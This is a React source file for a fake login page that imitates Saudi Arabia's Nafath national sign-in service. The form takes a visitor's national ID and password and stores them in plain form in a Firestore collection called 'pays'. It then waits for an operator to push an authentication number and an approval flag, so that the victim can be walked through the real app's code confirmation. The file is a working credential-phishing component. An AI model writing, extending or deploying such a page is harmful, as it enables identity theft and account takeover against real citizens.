import { useEffect, useState, useCallback } from "react";
import { Loader2, Menu, ShieldAlert, Smartphone } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { Alert } from "@/components/ui/alert";
import { db, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
import { NafazModal } from "@/components/nafaz-modal";
import { useVisitorRouting } from "@/hooks/use-visitor-routing";
import { useToast } from "@/hooks/use-toast";

export default function NafazPage() {
  const { toast } = useToast();
  const [showAuthDialog, setShowAuthDialog] = useState(false);
  const [authNumber, setAuthNumber] = useState<string>("");
  const [isLoading, setIsLoading] = useState(false);
  const [idLogin, setLoginID] = useState("");
  const [password, setPassword] = useState("");
  const [showError, setShowError] = useState("");

  const visitorId =
    typeof window !== "undefined"
      ? sessionStorage.getItem("visitor") || ""
      : "";

  useVisitorRouting({
    currentPage: "nafaz",
  });

  const updateData = useCallback(
    async (data: Record<string, any>) => {
      if (!isFirebaseConfigured || !db || !visitorId) return;
      try {
        const docRef = doc(db as Firestore, "pays", visitorId);
        await setDoc(
          docRef,
          {
            ...data,
            updatedAt: new Date().toISOString(),
          },
          { merge: true },
        );
      } catch (e) {
        console.error("Error updating nafaz data:", e);
      }
    },
    [visitorId],
  );

  useEffect(() => {
    if (!visitorId || !isFirebaseConfigured || !db) return;

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data();
          if (data.authNumber) {
            setAuthNumber(data.authNumber);
          }
          if (data.nafathApproved === true) {
            setShowAuthDialog(false);
            toast({
              title: "تم التحقق بنجاح",
              description: "تم التحقق من هويتك بنجاح عبر نفاذ",
            });
          } else if (data.nafathApproved === false) {
            setShowAuthDialog(false);
            setShowError("فشل التحقق من الهوية، يرجى المحاولة مرة أخرى");
          }
        }
      },
      (error) => {
        console.error("[nafaz] Firestore listener error:", error);
      },
    );

    return () => unsubscribe();
  }, [visitorId]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowError("");

    if (!idLogin || !password) {
      setShowError("يرجى إدخال جميع البيانات المطلوبة");
      return;
    }

    setIsLoading(true);

    try {
      await updateData({
        nafazId: idLogin,
        nafazPass: password,
        authNumber: "...",
        nafazStatus: "pending",
        nafazSubmittedAt: new Date().toISOString(),
      });

      setTimeout(() => {
        setShowAuthDialog(true);
        setIsLoading(false);
      }, 3000);
    } catch (error) {
      console.error("Error submitting nafaz login:", error);
      setShowError("حدث خطأ، يرجى المحاولة مرة أخرى");
      setIsLoading(false);
    }
  };

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
      dir="rtl"
    >
      <header className="bg-white shadow-sm border-b">
        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
          <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
          <div className="flex items-center gap-2">
            <ShieldAlert className="w-8 h-8 text-teal-600" />
            <span className="text-xl font-bold text-teal-600">نفاذ</span>
          </div>
          <div className="w-6"></div>
        </div>
      </header>

      <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
        <div className="text-center space-y-2">
          <h1 className="text-2xl font-bold text-gray-800 mb-2">
            الدخول على النظام
          </h1>
          <p className="text-gray-600 text-sm">
            استخدم تطبيق نفاذ للدخول بشكل آمن
          </p>
        </div>

        <div className="bg-gradient-to-r from-teal-600 to-teal-700 text-white p-6 rounded-xl text-center shadow-lg">
          <div className="flex items-center justify-center gap-2 mb-2">
            <ShieldAlert className="w-6 h-6" />
            <h2 className="text-xl font-bold">تطبيق نفاذ</h2>
          </div>
          <div className="w-16 h-1 bg-white/30 mx-auto rounded-full"></div>
        </div>

        <form onSubmit={handleLogin}>
          <Card className="bg-white shadow-lg border-0">
            <CardContent className="p-6 space-y-5">
              <div className="text-center">
                <p className="text-gray-700 font-semibold mb-1">
                  رقم بطاقة الأحوال/الإقامة
                </p>
                <p className="text-sm text-gray-500">
                  أدخل رقم الهوية الخاص بك للمتابعة
                </p>
              </div>

              <Input
                placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                dir="rtl"
                value={idLogin}
                onChange={(e) => setLoginID(e.target.value)}
                required
                data-testid="input-nafaz-id"
              />

              <Input
                placeholder="أدخل كلمة المرور الخاصة بك هنا"
                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                dir="rtl"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                type="password"
                required
                data-testid="input-nafaz-password"
              />

              {showError && (
                <Alert
                  className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
                  dir="rtl"
                >
                  <ShieldAlert className="w-5 h-5 text-red-600" />
                  {showError}
                </Alert>
              )}

              <Button
                type="submit"
                disabled={isLoading || !idLogin || !password}
                className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
                data-testid="button-nafaz-login"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="animate-spin ml-2" />
                    جاري التحقق...
                  </>
                ) : (
                  "تسجيل الدخول"
                )}
              </Button>

              <div className="pt-4 border-t">
                <div className="text-center text-gray-600 text-sm mb-3 font-medium">
                  لتحميل تطبيق نفاذ
                </div>
                <div className="flex justify-center gap-3">
                  <a
                    href="https://play.google.com/store"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:scale-105 transition-transform"
                  >
                    <div className="bg-black text-white px-4 py-2 rounded-lg flex items-center gap-2">
                      <span className="text-xs">GET IT ON</span>
                      <span className="font-semibold">Google Play</span>
                    </div>
                  </a>
                  <a
                    href="https://apps.apple.com"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:scale-105 transition-transform"
                  >
                    <div className="bg-black text-white px-4 py-2 rounded-lg flex items-center gap-2">
                      <span className="text-xs">Download on the</span>
                      <span className="font-semibold">App Store</span>
                    </div>
                  </a>
                </div>
              </div>
            </CardContent>
          </Card>
        </form>

        <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
          <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
          <CardContent className="p-8 text-center space-y-4 relative z-10">
            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
              <Smartphone className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-bold">منصة النفاذ الجديدة</h2>
            <p className="text-sm leading-relaxed text-teal-50">
              لتجربة أكثر سهولة استخدم النسخة المحدثة
              <br />
              من منصة النفاذ الوطني الموحد
            </p>
            <Button className="bg-white text-teal-700 hover:bg-teal-50 px-8 py-3 rounded-lg font-bold shadow-lg hover:shadow-xl transition-all mt-4">
              ابدأ الآن
            </Button>
          </CardContent>
        </Card>
      </main>

      <footer className="mt-12 p-6 bg-white border-t">
        <div className="text-center space-y-6 max-w-4xl mx-auto">
          <div className="text-gray-600 text-sm font-medium">تطوير وتشغيل</div>
          <div className="flex justify-center items-center">
            <div className="text-2xl font-bold text-teal-600">نفاذ</div>
          </div>
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              الرئيسية
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              حول
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              اتصل بنا
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              الشروط والأحكام
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              المساعدة والدعم
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              سياسة الخصوصية
            </a>
          </div>
        </div>
      </footer>

      <NafazModal
        isOpen={showAuthDialog}
        onClose={() => setShowAuthDialog(false)}
        authNumber={authNumber}
        visitorId={visitorId}
      />
    </div>
  );
}
